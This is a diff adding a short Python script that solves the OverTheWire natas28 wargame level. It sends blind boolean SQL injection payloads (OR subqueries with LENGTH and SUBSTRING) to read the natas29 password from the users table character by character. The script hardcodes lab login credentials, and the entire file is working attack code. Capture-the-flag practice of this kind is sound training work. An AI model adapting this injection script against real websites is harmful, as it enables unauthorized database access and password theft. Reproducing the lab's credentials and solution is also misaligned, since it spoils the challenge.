@@ -1,0 +1,32 @@
+import requests
+from string import ascii_letters, digits
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+auth = ("natas28", "JW2P2cqQ1iCYKBrjd7fNum2tCty9SLZ3")  
+def query(payload):
+    data = {"query": payload}
+    r = requests.post(url, data=data, auth=auth)
+    return len(r.text) > 3000  
+print("Finding password length...")
+length = 0
+for i in range(1, 50):
+    payload = f"' OR (SELECT LENGTH(password) FROM users WHERE username='natas29')={i}-- -"
+    if query(payload):
+        length = i
+        print(f"Length = {length}")
+        break
+
+password = ""
+chars = "_" + ascii_letters + digits 
+
+print("Extracting password...")
+for pos in range(1, length+1):
+    for ch in chars:
+        payload = f"' OR SUBSTRING((SELECT password FROM users WHERE username='natas29'),{pos},1)='{ch}'-- -"
+        if query(payload):
+            password += ch
+            print(f"Position {pos}: {ch} -> {password}")
+            break
+    else:
+        print("Char not found :(")
+print("Password for natas29:", password)
